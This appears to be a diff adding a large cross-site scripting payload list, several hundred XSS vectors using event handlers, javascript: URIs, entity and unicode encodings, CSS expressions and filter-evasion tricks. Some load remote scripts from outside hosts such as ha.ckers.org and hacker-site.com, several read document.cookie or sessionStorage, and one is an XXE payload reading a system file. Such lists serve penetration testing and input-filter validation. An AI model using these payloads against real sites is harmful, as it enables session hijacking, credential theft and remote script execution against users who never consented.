+<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
+ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
+‘; alert(document.cookie); var foo=’
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<img src="blah"onmouseover="document.vulnerable=true;">
+<video onerror="javascript:javascript:alert(1)"><source>
+<iframe src="javascript:document.vulnerable=true; <
+&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
+http://www.google<script .com>alert(document.location)</script
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<img src=x\x09onerror="javascript:alert(1)">
+&#x003C;
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+<p onfocus=alert(1) autofocus tabindex=1>	
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
+<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
+"><div onpointerrawupdate="console.log('XSS')"></div><!--
+<BODY BACKGROUND="javascript:alert('XSS')">
+1script3document.vulnerable=true;1/script3
+<~/XSS STYLE=xss:expression(alert('XSS'))>
+';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
+&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
+&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
+&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>;
+1script3document.vulnerable=true;1/script3
+<iframe// src=javaSCRIPT&colon;alert(1)
+&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<BR SIZE="&{alert('XSS')}">
+<IMG SRC="javascript:alert('XSS')"
+<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
+<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
+b=\"URL(\\"\";
+<SCRIPT/SRC="%(jscript)s"></SCRIPT>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+'"></title><script>alert(1111)</script>
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<embed src="data:text/html;base64,%(base64)s">
+<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
+<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
+<script\x09>javascript:alert(1)</script>
+<embed code=%(scriptlet)s></embed>
+<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<XSS STYLE="behavior: url(xss.htc);">
+<script charset="\x22>javascript:alert(1)</script>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<var onmouseover="prompt(1)">On Mouse Over</var>
+&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<svg/onload=parent[/al/.source+/ert/.source] (1)>
+'">><script>alert('XSS')</script>
+alert##<script>prompt(1234)</script>
+<div style="width: expression(document.vulnerable=true;);">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<;IMG SRC=";javascript:alert(';XSS';)";
+<table BACKGROUND="javascript:document.vulnerable=true;">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+<;? echo(';<;SCR)';;
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
+<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';XSS';)";)}<;/STYLE>;
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script ~~~>alert(0%0)</script ~~~>
+0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
+&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<script>/* *\x00/javascript:alert(1)// */</script>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+&#X0003c
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+<script src=%(jscript)s></script>
+';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//
+"><script>alert(document.cookie)</script>
+</script><script >alert(document.cookie)</script>
+<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+<%<!--'%><script>alert(1);</script -->
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
+<marquee onstart='javascript:alert('1');'>=(◕_◕)=
+<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
+ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
+<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
+"><img src=x onerror=javascript:alert(A)>
+<script>+-+-1-+-+alert(1)</script>
+&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
+<form><button formaction="javascript:alert(123)">crosssitespt
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+%253cscript%253ealert(1)%253c/script%253e
+<IMG SRC= onmouseover="alert('xxs')">
+<;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>;
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+\";alert('XSS');//
+<embed src="data:text/html;base64,%(base64)s">
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
+<ScripT>alert(1234)</ScRipT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<div STYLE="width: expression(document.vulnerable=true);">
+<;IMG LOWSRC=";javascript:alert(';XSS';);";>;
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<BODY ONLOAD=alert('XSS')>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<IMG SRC=# onmouseover="alert('xxs')">
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
+<script\x0A>javascript:alert(1)</script>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
+\&quot;;alert(&apos;XSS&apos;);//
+"><img src=x onerror=javascript:alert((A))>
+‘; alert(1);
+'`"><\x3Cscript>javascript:alert(1)</script>        
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+"><img src=x onerror=javascript:alert("A")>
+<script\x00>javascript:alert(1)</script>
+<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMG SRC=”javascript:alert(‘XSS’);”>
+"`'><script>\x20javascript:alert(1)</script>
+<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
+<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
+<script\x00>javascript:alert(1)</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+&#X3C
+"><img src=x onerror=window.open('https://www.google.com/');>
+<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
+<script src="/\%(jscript)s"></script>
+<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
+<img src=x\x11onerror="javascript:alert(1)">
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
+<img src="javascript:alert('XSS');">
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<BGSOUND SRC="javascript:alert('XSS');">
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+`"'><img src='#\x27 onerror=javascript:alert(1)>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+“><ScRiPt>alert(document.cookie)</script>
+<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
+</title><SCRIPT>document.vulnerable=true;</script>
+&#X003C;
+<% foo><x foo="%><script>javascript:alert(1)</script>">
+&#x3C
+"`'><script>\x09javascript:alert(1)</script>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
+&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+&lt;BODY ONLOAD=alert('XSS')&gt;
+&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
+<body oninput=javascript:alert(1)><input autofocus>
+<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+嘼嘾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
+<img \x00src=x onerror="alert(1)">
+<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
+<;HTML>;<;BODY>;
+<;HTML xmlns:xss>;
+<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
+</body>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
+<div style="background-image: url(javascript:document.vulnerable=true;);">
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+ABC<div style="x:\x00expression(javascript:alert(1)">DEF
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
+<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=javascript:alert('XSS')>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
+<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<script\x0A>javascript:alert(1)</script>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script>a=/XSS/\ndocument.vulnerable=true;</script>
+<script charset="\x22>javascript:alert(1)</script>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
+<BODY ONLOAD=alert('XSS')>
+<DIV STYLE="width: expression(alert('XSS'));">
+<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
+&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
+<BR SIZE="&{alert('XSS')}">
+<img src="/" =_=" title="onerror='prompt(1)'">
+[color=red width=expression(alert(123))][color]
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<script /**/>/**/alert(1)/**/</script /**/
+&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
+<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
+"`'><script>\x00javascript:alert(1)</script>
+&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<div style="behaviour: url([link to code]);">
+<base HREF="javascript:document.vulnerable=true;//">
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
+<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
+<BODY ONLOAD=alert('XSS')>
+<b <script>alert(1)</script>0
+<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
+<IMG SRC=javascript:javascript:alert(1)>
+"><img src=x onerror=window.open('https://www.google.com/');>
+<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
+#"><img src=M onerror=alert('XSS');>
+<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
+<script>alert(1)</script>
+<video onfocus=alert(1) autofocus tabindex=1>	
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<video/poster/onerror=alert()>
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
+<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
+<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=javascript:alert("XSS")>
+<script language="JavaScript">alert('XSS')</script>
+<img src="mocha:document.vulnerable=true;">
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<iframe src=%(scriptlet)s <
+<img src=`xx:xx`onerror=alert(1)>
+<style><!--</style><script>document.vulnerable=true;//--></script>
+<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<BODY ONLOAD=alert('hellox worldss')>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<img\x10src=x onerror="javascript:alert(1)">
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+"><svg onScroll="javascript:alert(1)//
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
+'></select><script>alert(123)</script>
+"><img src=x onerror=javascript:alert('1')>
+<script src="javascript:alert(1)">
+<img LOWSRC="javascript:document.vulnerable=true;">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
+<base HREF="javascript:document.vulnerable=true;//">
+<script>alert('XSS')</script>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+'';!--"<XSS>=&{()}
+<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
+</textarea>'"><script>alert(document.cookie)</script>
+&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
+<img src=x\x09onerror="javascript:alert(1)">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>;
+&#X000003c
+<br size=\"&{alert('XSS')}\">
+"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+" onfocus=alert(document.domain) "> <"
+<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<script /**/>/**/alert(1)/**/</script /**/
+<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
+<img \x00src=x onerror="alert(1)">
+"`'><script>\xE2\x80\x84javascript:alert(1)</script>
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
+&#X0003C
+\u003C
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
+<IMG LOWSRC="javascript:alert('XSS')">
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+<iframe/src \/\/onload = prompt(1)
+`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
+<script>javascript:alert(1)</script\x0A
+ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+"`'><script>\xC2\x85javascript:alert(1)</script>
+<script>javascript:alert(1)</script\x0D
+<![<!--]]<script>document.vulnerable=true;//--></script>
+<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<embed src="javascript:alert(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+&lt;/BODY&gt;&lt;/HTML&gt;
+<svg/onload​=alert&sol;**&sol;(3)>
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
+<embed src="javascript:alert(1)">
+&#x003c;
+<SCRIPT SRC=%(jscript)s?<B>
+<INPUT+TYPE="IMAGE"+SRC="javascript:alert(1);">
+<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
+<video><source onerror="javascript:javascript:alert(1)">
+<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
+&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<br SIZE="&{document.vulnerable=true}">
+<!--<img src="--><img src=x onerror=javascript:alert(1)//">
+perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+<img/src/onerror="window[`al+/e/[`ex + `ec`]`e`+`rt`](2)">
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;
+alert;pg("XSS")
+echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
+';alert(document.cookie)//
+<IMG SRC=javascript:alert('XSS')>
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
+<IMG SRC=# onmouseover="alert('xxs')">
+&lt;
+<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
+<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
